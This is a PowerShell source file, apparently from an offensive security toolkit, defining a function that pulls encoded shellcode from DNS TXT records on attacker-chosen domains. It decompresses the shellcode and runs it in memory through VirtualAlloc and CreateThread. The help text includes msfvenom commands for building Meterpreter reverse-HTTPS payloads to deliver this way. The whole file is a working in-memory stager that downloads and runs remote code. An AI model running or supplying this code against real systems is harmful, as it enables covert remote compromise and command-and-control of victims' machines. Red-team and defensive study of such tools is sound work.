function Execute-DNSTXT-Code
{
<#
.SYNOPSIS
Payload which could execute shellcode from DNS TXT queries.

.DESCRIPTION
This payload is able to pull shellcode from txt record of a domain. 
Below commands could be used to generate shellcode to be usable with this script
./msfvenom -p windows/meterpreter/reverse_https -f powershell LHOST=<>
./msfvenom -p windows/x64/meterpreter/reverse_https -f powershell LHOST=<>

To generate TXT records from above shellcode, use Out-DnsTxt.ps1 in the Utility folder.

.PARAMETER shellcode32
The domain (or subdomain) whose subbdomain's TXT records would hold 32-bit shellcode.

.PARAMETER shellcode64
The domain (or subdomain) whose subbdomain's TXT records would hold 64-bit shellcode.

 .PARAMETER AUTHNS
Authoritative Name Server for the domains.

.PARAMETER subdomains
The number of subdomains which would be used to provide shellcode from their TXT records.


.EXAMPLE
PS > Execute-DNSTXT-Code
The payload will ask for all required options.

.EXAMPLE
PS > Execute-DNSTXT-Code -ShellCode32 32.alteredsecurity.com -ShellCode64 64.alteredsecurity.com -AuthNS ns8.zoneedit.com -SubDomains 5
Use above from non-interactive shell.

.LINK
http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
https://github.com/samratashok/nishang

.NOTES
The code execution logic is based on this post by Matt.
http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ShellCode32,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $ShellCode64,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $AuthNS,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $Subdomains

    )
    
    #Function to get shellcode from TXT records
    function Get-ShellCode
    {
        Param(
            [Parameter()]
            [String]
            $ShellCode
        )
        $i = 1
        while ($i -le $subdomains)
        {
            
            if ($AuthNS -ne $null)
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode $AuthNS") 
            }
            else
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode") 
            }
            $temp = $getcommand | select-string -pattern "`""
            $tmp1 = ""
            $tmp1 = $tmp1 + $temp
            $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
            $i++
        }
        #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
        $dec = [System.Convert]::FromBase64String($encdata)
        $ms = New-Object System.IO.MemoryStream
        $ms.Write($dec, 0, $dec.Length)
        $ms.Seek(0,0) | Out-Null
        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
        $sr = New-Object System.IO.StreamReader($cs)
        $sc = $sr.readtoend()
        return $sc
    }
    if ([IntPtr]::Size -eq 8) 
    {
        $Shell64 = (Get-ShellCode $ShellCode64)
        #Remove unrequired things from msf shellcode
        $tmp = $Shell64 -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
        [Byte[]]$sc = $tmp -split ','
    } 
    else
    {
        $shell32 = (Get-ShellCode $ShellCode32)
        $tmp = $Shell32 -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
        [Byte[]]$sc = $tmp -split ','
    }

    #Code Execution logic
    $code = @' 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
    [DllImport("msvcrt.dll")] 
    public static extern IntPtr memset(IntPtr dest, uint src, uint count); 
'@ 
    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru 
    $size = 0x1000 
    if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
    $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} 
    $winFunc::CreateThread(0,0,$x,0,0,0) 
    while($True)
    {
        start-sleep -Seconds 100
    }
}


